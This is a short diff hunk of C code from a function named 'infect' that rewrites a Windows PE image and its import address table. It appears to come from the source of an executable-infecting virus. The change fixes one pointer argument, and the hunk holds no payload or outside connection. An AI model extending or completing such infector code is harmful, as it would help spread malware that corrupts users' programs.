@@ -910,7 +910,7 @@ int infect(void)
          goto free_file;
       }
       
-      CVector rewritten_image = cvector_alloc(iat, sizeof(uint8_t), 0);
+      CVector rewritten_image = cvector_alloc(&iat, sizeof(uint8_t), 0);
 
       if (nt_headers->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
       {
